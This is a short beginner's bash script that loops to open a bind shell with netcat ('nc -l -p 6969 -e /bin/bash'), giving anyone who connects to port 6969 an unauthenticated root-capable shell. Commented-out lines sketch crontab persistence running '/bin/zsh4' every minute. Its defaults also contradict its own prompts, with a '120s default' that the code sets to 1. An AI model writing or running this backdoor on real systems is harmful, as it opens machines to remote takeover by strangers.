#! /bin/bash

# This is my first real bash script, here I am commenting out so I know
# what I am going to do with this. The first script will add something to
# the cron file every 5 seconds, to proof as a form of persistance


echo "How many seconds should I wait to re-open the beacon?(120s default)"

read delay

echo "should I stop after a certian amount of iterations? (No limit default)"

read limit


if [ -z "$delay" ] ; then
 let delay=1
fi


if [ -z "$limit" ] ; then
 # persistance?
 # $(crontab -l > /bin/newcron)
 # echo "*/1 * * * * /bin/zsh4" >> /bin/newcron
 # $(crontab /bin/newcron ; rm /bin/newcron)
 while true ; do
   $(nc -l -p 6969 -e /bin/bash)
   sleep $delay
 done
else
 # persistance?
 # $(crontab */1 * * * * /bin/zsh4)
 while [ "$limit" -gt 0 ] ; do
   $(nc -l -p 6969 -e /bin/bash)
   echo "Opened Shell"
   sleep $delay
   ((limit--))
 done
fi
